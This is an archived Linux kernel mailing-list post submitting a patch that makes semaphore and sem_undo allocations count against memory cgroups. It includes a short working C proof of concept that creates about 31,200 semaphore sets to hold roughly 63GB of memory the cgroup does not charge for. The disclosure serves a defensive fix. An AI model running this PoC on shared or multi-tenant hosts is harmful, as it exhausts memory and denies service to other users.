<html><head><title>[PATCH] memcg: charge semaphores and sem_undo objects - Yutian Yang</title><link
rel=alternate
title="Atom feed"
href="../new.atom"
type="application/atom+xml"/><style>pre{white-space:pre-wrap}*{font-size:100%;font-family:monospace}</style><link
type=text/css
rel=stylesheet
href=../216light.css?66c655cb
media=screen,print /><link
type=text/css
rel=stylesheet
media="screen and (prefers-color-scheme:dark)"
href=../216dark.css?66c655cb /></head><body><form
action="../"><pre><a
href="../?t=20210715071458"><b>linux-mm.kvack.org archive mirror</b></a>
<input
name=q
type=text /><input
type=submit
value=search /> <a
href="../_/text/help/">help</a> / <a
href="../_/text/color/">color</a> / <a
id=mirror
href="../_/text/mirror/">mirror</a> / <a
href="../new.atom">Atom feed</a></pre></form><pre
id=b>From: Yutian Yang &lt;nglaive@gmail.com&gt;
To: mhocko@kernel.org, hannes@cmpxchg.org, vdavydov.dev@gmail.com
Cc: <a
href="../../cgroups/?t=20210715071458">cgroups@vger.kernel.org</a>, <a
href="../../linux-mm/?t=20210715071458">linux-mm@kvack.org</a>,
	shenwenbo@zju.edu.cn, Yutian Yang &lt;nglaive@gmail.com&gt;
Subject: <a
href="#r"
id=t>[PATCH] memcg: charge semaphores and sem_undo objects</a>
Date: Thu, 15 Jul 2021 03:14:44 -0400	<a
href="#r">[thread overview]</a>
Message-ID: &lt;1626333284-1404-1-git-send-email-nglaive@gmail.com&gt; (<a href="raw">raw</a>)

This patch adds accounting flags to semaphores and sem_undo allocation
sites so that kernel could correctly charge these objects. 

A malicious user could take up more than 63GB unaccounted memory under 
default sysctl settings by exploiting the unaccounted objects. She could 
allocate up to 32,000 unaccounted semaphore sets with up to 32,000 
unaccounted semaphore objects in each set. She could further allocate one 
sem_undo unaccounted object for each semaphore set.

The following code shows a PoC that takes ~63GB unaccounted memory, while 
it is charged for only less than 1MB memory usage. We evaluate the PoC on 
QEMU x86_64 v5.2.90 + Linux kernel v5.10.19 + Debian buster. 

/*------------------------- POC code ----------------------------*/
#define _GNU_SOURCE
#include &lt;sys/types.h&gt;
#include &lt;sys/ipc.h&gt;
#include &lt;sys/sem.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;time.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sched.h&gt;

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

int main(int argc, char *argv[]) {
  int err, semid;
  struct sembuf sops;
  for (int i = 0; i &lt; 31200; ++i) {
    semid = semget(IPC_PRIVATE, 31200, IPC_CREAT);
    if (semid == -1) {
      errExit(&#34;semget&#34;);
    }
    sops.sem_num = 0;
    sops.sem_op = 1;
    sops.sem_flg = SEM_UNDO;
    err = semop(semid, &#38;sops, 1);
    if (err == -1) {
      errExit(&#34;semop&#34;);
    }
  }
  while(1);
  return 0;
}
/*-------------------------- end --------------------------------*/

Thanks!

Yutian Yang,
Zhejiang University

Signed-off-by: Yutian Yang &lt;nglaive@gmail.com&gt;
---
 <a
id=iZ31ipc:sem.c
href=#Z31ipc:sem.c>ipc/sem.c</a> | 4 ++--
 1 file <a href="#related">changed</a>, 2 insertions(+), 2 deletions(-)

<span
class="head"><a
href=#iZ31ipc:sem.c
id=Z31ipc:sem.c>diff</a> --git a/ipc/sem.c b/ipc/sem.c
index f6c30a85d..6860de0b1 100644
--- a/ipc/sem.c
+++ b/ipc/sem.c
</span><span
class="hunk">@@ -511,7 +511,7 @@ static struct sem_array *sem_alloc(size_t nsems)
</span> 	if (nsems &gt; (INT_MAX - sizeof(*sma)) / sizeof(sma-&gt;sems[0]))
 		return NULL;
 
<span
class="del">-	sma = kvzalloc(struct_size(sma, sems, nsems), GFP_KERNEL);
</span><span
class="add">+	sma = kvzalloc(struct_size(sma, sems, nsems), GFP_KERNEL_ACCOUNT);
</span> 	if (unlikely(!sma))
 		return NULL;
 
<span
class="hunk">@@ -1935,7 +1935,7 @@ static struct sem_undo *find_alloc_undo(struct ipc_namespace *ns, int semid)
</span> 	rcu_read_unlock();
 
 	/* step 2: allocate new undo structure */
<span
class="del">-	new = kzalloc(sizeof(struct sem_undo) + sizeof(short)*nsems, GFP_KERNEL);
</span><span
class="add">+	new = kzalloc(sizeof(struct sem_undo) + sizeof(short)*nsems, GFP_KERNEL_ACCOUNT);
</span> 	if (!new) {
 		ipc_rcu_putref(&#38;sma-&gt;sem_perm, sem_rcu_free);
 		return ERR_PTR(-ENOMEM);
-- 
2.25.1


</pre><hr><pre><a
href="../CALvZod4-Vh4O4-PN661jqicSg95GPf87nv10xAYr1yG6oZQk8A@mail.gmail.com/"
rel=next>next</a>             <a
href="#R">reply</a>	other threads:[<a
href="../?t=20210715071458">~2021-07-15  7:14 UTC</a>|<a
href="../">newest</a>]

<b>Thread overview: </b>5+ messages / expand[<a
href="T/#u">flat</a>|<a
href="t/#u">nested</a>]  <a
href="t.mbox.gz">mbox.gz</a>  <a
href="t.atom">Atom feed</a>  <a
href="#b">top</a>
<b>2021-07-15  7:14 <a
id=r
href="#t">Yutian Yang [this message]</a></b>
2021-07-15 17:05 ` <a
href="../CALvZod4-Vh4O4-PN661jqicSg95GPf87nv10xAYr1yG6oZQk8A@mail.gmail.com/">[PATCH] memcg: charge semaphores and sem_undo objects</a> Shakeel Butt
2021-07-16  3:57   ` <a
href="../44325e3a-f4e9-c19a-4a00-672d1d61120d@virtuozzo.com/">Vasily Averin</a>
2021-07-15 17:49 ` <a
href="../YPB1EPaunr5587h5@casper.infradead.org/">Matthew Wilcox</a>
2021-07-15 18:22   ` <a
href="../CALvZod7sGcOASaFi6st40DSsXh1a0mv7HQ7Vc1pXxnsDgmDPkg@mail.gmail.com/">Shakeel Butt</a>
</pre><form id=related
action=../
><pre>find likely ancestor, descendant, or conflicting patches for <a
href=#t>this message</a>:
<textarea name=q cols=72 rows=3>( dfblob:f6c30a85 dfblob:6860de0b )
 OR (
bs:&#34;[PATCH] memcg: charge semaphores and sem_undo objects&#34; )</textarea>
<input type=submit value=search
/>	(<a href=../_/text/help/#search>help</a>)</pre></form>
<hr><pre
id=R><b>Reply instructions:</b>

You may reply publicly to <a
href=#t>this message</a> via plain-text email
using any one of the following methods:

* Save the following mbox file, import it into your mail client,
  and reply-to-all from there: <a
href=raw>mbox</a>

  Avoid top-posting and favor interleaved quoting:
  <a
href="https://en.wikipedia.org/wiki/Posting_style#Interleaved_style">https://en.wikipedia.org/wiki/Posting_style#Interleaved_style</a>

* Reply using the <b>--to</b>, <b>--cc</b>, and <b>--in-reply-to</b>
  switches of git-send-email(1):

  git send-email \
    --in-reply-to=1626333284-1404-1-git-send-email-nglaive@gmail.com \
    --to=nglaive@gmail.com \
    --cc=cgroups@vger.kernel.org \
    --cc=hannes@cmpxchg.org \
    --cc=linux-mm@kvack.org \
    --cc=mhocko@kernel.org \
    --cc=shenwenbo@zju.edu.cn \
    --cc=vdavydov.dev@gmail.com \
    /path/to/YOUR_REPLY

  <a
href="https://kernel.org/pub/software/scm/git/docs/git-send-email.html">https://kernel.org/pub/software/scm/git/docs/git-send-email.html</a>

* If your mail client supports setting the <b>In-Reply-To</b> header
  via mailto: links, try the <a
href="mailto:nglaive@gmail.com?In-Reply-To=%3C1626333284-1404-1-git-send-email-nglaive@gmail.com%3E&#38;Cc=cgroups%40vger.kernel.org%2Channes%40cmpxchg.org%2Clinux-mm%40kvack.org%2Cmhocko%40kernel.org%2Cshenwenbo%40zju.edu.cn%2Cvdavydov.dev%40gmail.com&#38;Subject=Re%3A%20%5BPATCH%5D%20memcg%3A%20charge%20semaphores%20and%20sem_undo%20objects">mailto: link</a>
</pre>

  Be sure your reply has a <b>Subject:</b> header at the top and a blank line
  before the message body.
<hr><pre>This is a public inbox, see <a
href="../_/text/mirror/">mirroring instructions</a>
for how to clone and mirror all data and code used for this inbox;
as well as URLs for NNTP newsgroup(s).</pre></body></html>